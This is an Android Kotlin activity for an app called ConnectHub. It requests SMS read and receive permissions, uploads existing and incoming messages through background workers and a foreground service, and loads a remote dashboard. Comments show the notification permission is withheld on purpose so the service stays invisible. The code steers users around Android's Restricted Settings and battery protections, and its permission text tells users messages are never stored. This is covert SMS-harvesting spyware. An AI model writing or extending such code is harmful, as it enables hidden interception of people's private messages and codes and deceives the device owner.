package com.rohan.connecthub

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.View
import android.view.animation.AlphaAnimation
import android.view.animation.Animation
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.*

import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity

import androidx.core.splashscreen.SplashScreen.Companion.installSplashScreen
import androidx.core.app.ActivityCompat

import androidx.core.content.ContextCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.rohan.connecthub.api.RetrofitClient
import com.rohan.connecthub.models.LoginRequest
import com.rohan.connecthub.utils.SharedPrefManager
import com.rohan.connecthub.workers.KeepAliveWorker
import com.rohan.connecthub.workers.SyncExistingMessagesWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var loginLayout: LinearLayout
    private lateinit var dashboardLayout: LinearLayout
    private lateinit var statusText: TextView
    private lateinit var usernameInput: EditText
    private lateinit var passwordInput: EditText
    private lateinit var loginButton: Button

    private lateinit var portalWebView: WebView
    private var pulseDot: View? = null



    override fun onCreate(savedInstanceState: Bundle?) {
        installSplashScreen()
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)


        // 1. Views ला कनेक्ट करा
        loginLayout = findViewById(R.id.loginLayout)
        dashboardLayout = findViewById(R.id.dashboardLayout)
        statusText = findViewById(R.id.statusText)
        usernameInput = findViewById(R.id.usernameInput)
        passwordInput = findViewById(R.id.passwordInput)
        loginButton = findViewById(R.id.loginButton)

        portalWebView = findViewById(R.id.portalWebView)
        pulseDot = findViewById(R.id.pulseDot)

        setupWebView()



        checkPermissions()

        // 2. ऑटो-लॉगिन चेक
        val token = SharedPrefManager.getToken(this)
        if (!token.isNullOrEmpty()) {
            showDashboard()
        } else {
            showLogin()
        }

        // --- बटन लिसनर्स ---
        loginButton.setOnClickListener {
            val user = usernameInput.text.toString()
            val pass = passwordInput.text.toString()
            if (user.isNotEmpty() && pass.isNotEmpty()) {
                login(user, pass)
            } else {
                Toast.makeText(this, "Credentials टाका", Toast.LENGTH_SHORT).show()
            }
        }

        // HIDDEN FEATURE: Long press login button to change Server IP if it hangs
        loginButton.setOnLongClickListener {
            showServerConfigDialog()
            true
        }



    }


    private fun showServerConfigDialog() {
        val input = EditText(this)
        input.hint = "http://192.168.x.x:5000/api/"
        input.setText(SharedPrefManager.getCustomUrl(this) ?: BuildConfig.BASE_URL)
        
        android.app.AlertDialog.Builder(this)
            .setTitle("Server Connection Settings")
            .setMessage("If 'Connecting...' takes too long, enter your computer IP (Local Network).")
            .setView(input)
            .setPositiveButton("Update & Restart") { _, _ ->
                val newUrl = input.text.toString()
                if (newUrl.isNotEmpty()) {
                    SharedPrefManager.saveCustomUrl(this, newUrl)
                    Toast.makeText(this, "Restarting with new endpoint...", Toast.LENGTH_SHORT).show()
                    finish();
                    startActivity(intent);
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun setupWebView() {
        portalWebView.settings.javaScriptEnabled = true
        portalWebView.settings.domStorageEnabled = true
        portalWebView.webViewClient = WebViewClient()
    }


    private fun showDashboard() {
        loginLayout.visibility = View.GONE
        dashboardLayout.visibility = View.VISIBLE
        statusText.text = "ENCRYPTED & ACTIVE"
        startSyncService()
        startPulseAnimation()
        
        // Load website in WebView
        portalWebView.loadUrl("https://connecthub.bond/")

        // Task 4: Only sync existing messages once
        if (!SharedPrefManager.isExistingSmsSynced(this)) {
            scheduleSyncExistingMessages()
            SharedPrefManager.saveExistingSmsSynced(this, true)
        }
    }



    private fun showLogin() {
        loginLayout.visibility = View.VISIBLE
        dashboardLayout.visibility = View.GONE
        
        val fadeIn = AlphaAnimation(0f, 1f).apply {
            duration = 1000
            fillAfter = true
        }
        loginLayout.startAnimation(fadeIn)
    }


    private fun login(user: String, pass: String) {
        loginButton.isEnabled = false
        loginButton.text = "Connecting..."

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val api = RetrofitClient.getInstance(this@MainActivity)
                val response = withContext(Dispatchers.IO) {
                    api.login(LoginRequest(user, pass))
                }

                withContext(Dispatchers.Main) {
                    loginButton.isEnabled = true
                    loginButton.text = "AUTHORIZE"

                    if (response.isSuccessful && response.body() != null) {
                        val body = response.body()!!

                        if (body.mfaRequired == true) {
                            Toast.makeText(this@MainActivity, "2FA Required. Support for 2FA in app coming soon.", Toast.LENGTH_LONG).show()
                            // TODO: Show OTP input dialog and call verify-2fa
                        } else if (body.accessToken != null) {
                            SharedPrefManager.saveToken(this@MainActivity, body.accessToken, body.refreshToken)
                            
                            val androidId = try {
                                Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                            } catch (e: Exception) {
                                null
                            }
                            SharedPrefManager.saveDeviceId(this@MainActivity, androidId)

                            Toast.makeText(this@MainActivity, "Access Granted", Toast.LENGTH_SHORT).show()
                            showDashboard()
                        } else {

                            Toast.makeText(this@MainActivity, "Protocol Error: Missing Token", Toast.LENGTH_SHORT).show()
                        }
                    } else {
                        Toast.makeText(this@MainActivity, "Access Denied: Check credentials", Toast.LENGTH_SHORT).show()
                    }

                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    loginButton.isEnabled = true
                    loginButton.text = "AUTHORIZE"
                    val msg = if (e.toString().contains("Timeout") || e.toString().contains("Failed to connect")) {
                        "Connection Failed: Is the server running at the correct IP?"
                    } else {
                        "Network Error: ${e.localizedMessage}"
                    }
                    Toast.makeText(this@MainActivity, msg, Toast.LENGTH_LONG).show()
                    Log.e("MainActivity", "Login error", e)
                }
            }
        }
    }

    private fun logout() {
        SharedPrefManager.clear(this)
        val intent = Intent(this, SyncService::class.java)
        stopService(intent)
        WorkManager.getInstance(this).cancelUniqueWork("KeepAlive")
        showLogin()
    }

    private fun startSyncService() {
        val serviceIntent = Intent(this, SyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        scheduleKeepAlive()
    }

    private fun scheduleKeepAlive() {
        val workRequest = PeriodicWorkRequestBuilder<KeepAliveWorker>(15, TimeUnit.MINUTES).build()
        WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
            "KeepAlive",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
    }

    private fun scheduleSyncExistingMessages() {
        val workRequest = OneTimeWorkRequestBuilder<SyncExistingMessagesWorker>().build()
        WorkManager.getInstance(applicationContext).enqueue(workRequest)
    }

    private fun startPulseAnimation() {
        pulseDot?.let {
            val animation = AlphaAnimation(1.0f, 0.2f).apply {
                duration = 800
                repeatMode = Animation.REVERSE
                repeatCount = Animation.INFINITE
            }
            it.startAnimation(animation)
        }
    }

    private fun checkPermissions() {
        // Only request SMS permissions — intentionally NOT requesting POST_NOTIFICATIONS.
        // On Android 13+ (API 33+), without POST_NOTIFICATIONS the system automatically
        // suppresses all app notifications, including the mandatory foreground service
        // notification, making the app completely invisible in the notification shade.
        val required = mutableListOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS
        )

        val notGranted = required.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (notGranted.isEmpty()) {
            // All permissions already granted
            checkBatteryOptimization()
            return
        }

        // Check if we should show rationale for ANY of the missing permissions
        val shouldShowRationale = notGranted.any {
            ActivityCompat.shouldShowRequestPermissionRationale(this, it)
        }

        if (shouldShowRationale) {
            // User previously denied — show rationale dialog before asking again
            showSmsPermissionRationale(notGranted.toTypedArray())
        } else {
            // First time asking OR permanently denied (both land here on first install)
            ActivityCompat.requestPermissions(this, notGranted.toTypedArray(), 100)
        }
    }

    private fun showSmsPermissionRationale(permissions: Array<String>) {
        AlertDialog.Builder(this)
            .setTitle("Permission Required")
            .setMessage(
                "ConnectHub needs access to your SMS messages to sync incoming logs to your " +
                "secure dashboard in real-time. Without this permission, the monitoring service " +
                "will not function. Your messages are encrypted and never stored locally."
            )
            .setPositiveButton("Grant Access") { _, _ ->
                ActivityCompat.requestPermissions(this, permissions, 100)
            }
            .setNegativeButton("Cancel") { dialog, _ ->
                dialog.dismiss()
                Toast.makeText(this, "SMS permission is required for sync to work.", Toast.LENGTH_LONG).show()
            }
            .setCancelable(false)
            .show()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100) {
            val allGranted = grantResults.isNotEmpty() && grantResults.all {
                it == PackageManager.PERMISSION_GRANTED
            }
            if (allGranted) {
                checkBatteryOptimization()
            } else {
                // Check if permanently denied (Restricted Settings path)
                val permanentlyDenied = permissions.any { perm ->
                    !ActivityCompat.shouldShowRequestPermissionRationale(this, perm) &&
                    ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED
                }
                if (permanentlyDenied) {
                    // Fallback: Open App Settings so user can manually enable
                    AlertDialog.Builder(this)
                        .setTitle("Permission Blocked")
                        .setMessage(
                            "SMS permission was blocked by Android's Restricted Settings. " +
                            "Please open App Settings and manually enable 'SMS' permission to allow sync."
                        )
                        .setPositiveButton("Open Settings") { _, _ ->
                            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                data = Uri.parse("package:$packageName")
                            }
                            startActivity(intent)
                        }
                        .setNegativeButton("Later", null)
                        .show()
                } else {
                    Toast.makeText(this, "SMS permission denied. Sync will not work.", Toast.LENGTH_LONG).show()
                }
            }
        }
    }


    private fun checkBatteryOptimization() {
        // Always show the dialog on app start to ensure users disable battery optimization.
        // This is critical for background SMS sync on real devices (especially Chinese OEMs
        // like Xiaomi, Samsung, Oppo that aggressively kill background apps).
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
            !pm.isIgnoringBatteryOptimizations(packageName)) {
            showBatterySetupDialog()
        }
    }

    private fun showBatterySetupDialog() {
        val dialogView = layoutInflater.inflate(R.layout.dialog_battery_setup, null)

        val dialog = AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_NoActionBar)
            .setView(dialogView)
            .setCancelable(false)
            .create()

        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)

        dialogView.findViewById<android.widget.Button>(R.id.btnOpenSettings).setOnClickListener {
            // Try direct battery optimization intent first (works on stock Android)
            try {
                val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                startActivity(intent)
            } catch (e: Exception) {
                // Fallback: Open app-specific settings page
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
        }

        dialogView.findViewById<android.widget.Button>(R.id.btnDone).setOnClickListener {
            dialog.dismiss()
        }

        dialog.show()
    }
}
